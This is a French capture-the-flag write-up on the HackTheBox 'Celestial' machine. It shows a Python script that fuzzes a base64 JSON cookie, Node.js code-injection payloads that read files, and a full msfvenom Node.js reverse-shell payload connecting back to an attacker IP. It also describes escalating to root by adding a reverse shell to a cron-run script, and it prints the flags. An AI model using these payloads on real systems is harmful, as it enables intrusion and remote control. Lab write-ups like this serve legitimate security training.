# Solution du CTF Celestial de HackTheBox

Back to the root(s)
-------------------

En attendant la venue d'un nouveau CTF basé sur Windows sur [HackTheBox](https://www.hackthebox.eu/), je me suis penché sur différentes machines sous Linux.  

*Celestial* était l'une de celles-ci.  

2 + 2 = 22
----------

J'ai commencé par le classique scan de ports Nmap, ici un peu plus poussé via l'utilisation de plus de scripts :  

```plain
nmap -T5 --script safe -sC -sV -p- -A -oA scan 10.10.10.85
```

La seule chose à retenir c'est la présence du port 3000 ouvert ainsi que de nombreux ports non filtrés, ce qui peut être utile pour la suite :  

```plain
Not shown: 63272 closed ports, 2262 filtered ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-comments-displayer: Couldn't find any comments.
|_http-date: Wed, 22 Aug 2018 09:49:39 GMT; -4s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers:
|   X-Powered-By: Express
|   Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Wed, 22 Aug 2018 10:04:44 GMT; HttpOnly
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 12
|   ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
|   Date: Wed, 22 Aug 2018 09:49:44 GMT
|   Connection: close
```

On voit clairement la mention de *Nodejs*. Au vu du numéro de port peu banal pour un service web j'ai d'abord pensé qu'il s'agissait d'un service de débogage à distance, j'ai donc lancé le module *Metasploit* *multi/misc/nodejs\_v8\_debugger* mais ceci n'a mené nul part, la réponse n'était clairement pas celle attendue par *Metasploit* je faisais fausse route.  

Je pointe donc mon browser sur ce port 3000 et j'obtiens une erreur HTTP. Un reload de la page plus tard et on a le message *Hey Dummy 2 + 2 is 22*.  

Il n'y a que [Javascript pour sortir cela bien sûr](https://gfycat.com/fr/gifs/detail/offensivefarflungbluefish) (oh no! It's retarded!) et c'est indice suffisant pour ce qui va venir.  

Si le message vient après un reload c'est parce qu'un cookie a été défini par le site. On le voit d'ailleurs dans le scan Nmap et il peut se décoder via base64 ce qui nous donne un dictionnaire JSON :  

```python
{
  "username":"Dummy",
  "country":"Idk Probably Somewhere Dumb",
  "city":"Lametown",
  "num":"2"
}
```

Attaquer les valeurs du dictionnaire n'est pas vraiment compliqué pour qui maîtrise bien Python (ou un autre vrai langage de programmation héhéhé).  

On part du même dictionnaire que l'on modifie dans une boucle que l'on sérialise en JSON pour ensuite encoder en base64 la chaîne obtenue transmise alors dans le cookie.  

Ma remière tentative a consisté à bruteforcer le champ *username* sans succès.  

Comme on est en face de Javascript il s'agit probablement d'une faille d'injection de code, auquel cas l'injection est à faire dans le champ *num*

Pour attaquer sans trop de difficultés ce champ j'ai écrit le script suivant, il suffit alors de lui passer un fichier avec les payloads :  

```python
import sys
import json
from urllib.parse import quote
from base64 import b64encode

import requests
from requests.exceptions import RequestException

data = {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
KEY = "num"
sess = requests.session()

wordlist = sys.argv[1]
with open(wordlist) as fd:
    for line in fd:
        word = line.strip()
        data["num"] = word

        try:
            raw = json.dumps(data).encode()
        except UnicodeEncodeError:
            continue
        else:
            raw = quote(b64encode(raw))
            try:
                response = sess.get(
                    "http://10.10.10.85:3000/",
                    headers={"cookie": "profile={}".format(raw)}
                )
            except RequestException:
                continue
            else:
                print(response.status_code, word)
                print(response.content)
```

Pour les payloads intéressants on peut se baser [sur cette page](https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html) et commencer ainsi par l'injection suivante :  

```javascript
;res.end(require('fs').readdirSync('.').toString())
```

Ce qui nous retourne le contenu suivant :  

```plain
.ICEauthority
.Xauthority
.bash_history
.bash_logout
.bashrc
.cache
.config
.dbus
.dmrc
.gconf
.gnupg
.gvfs
.lesshst
.local
.mozilla
.nano
.node_repl_history
.npm
.profile
.selected_editor
.sudo_as_admin_successful
.xsession-errors
.xsession-errors.old
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
examples.desktop
node_modules
output.txt
server.js
```

On peut alors continuer en dumpant le contenu du premier flag avec le payload *;res.end(require('fs').readFileSync('Documents/user.txt'))* :  

```plain
9a093cd22ce86b7f41db4116e80d0b0f
```

Title is undefined
------------------

Lister les dossiers, lire des fichiers, c'est déjà pas mal mais on veut un vrai shell alors on dégaine *msfvenom* (aka *Il y a un payload pour ça*).  

```plain
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 --arch nodejs --platform nodejs -f raw
No encoder or badchars specified, outputting raw payload
Payload size: 797 bytes
 (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(443, "10.10.14.9", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();
```

On injecte ce payload et notre reverse shell minimaliste arrive :)   

On dispose d'un accès avec le compte *sun* :  

```plain
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

Il y a deux fichiers intéressants dans le home de l'utilisateur :  

```plain
sun@sun:~$ cat Documents/script.py
print "Script is running..."

sun@sun:~$ ls -l output.txt
-rw-r--r-- 1 root root 63 Aug 22 09:05 output.txt

sun@sun:~$ cat output.txt
Script is running...
Script is running...
Script is running...
```

Il semble que le script soit exécuté par root à intervalle régulier ce qui expliquerait les permissions sur *output.txt*.  

On ne voit rien dans */etc/crontab* qui correspond et on n'a pas le mot de passe de *sun* pour afficher ses permissions sudo... Mais on peut écrire dans *script.py*. Alors [je tente ma chance](https://www.youtube.com/watch?v=1t-Bxw2lbdw) ?  

Je rajoute [une ligne de reverse shell python](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) au fichier et *sure enough* on finit par obtenir notre accès et le flag qui va avec (*ba1d0019200a54e370ca151007a8095a*).  

It is not my code fault, it's Javascript
----------------------------------------

That was fast... Pour être sûr que j'avais suivi le chemin attendu j'ai retrouvé la ligne suivante dans le *crontab* de root :  

```plain
*/5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```


*Published August 25 2018 at 18:19*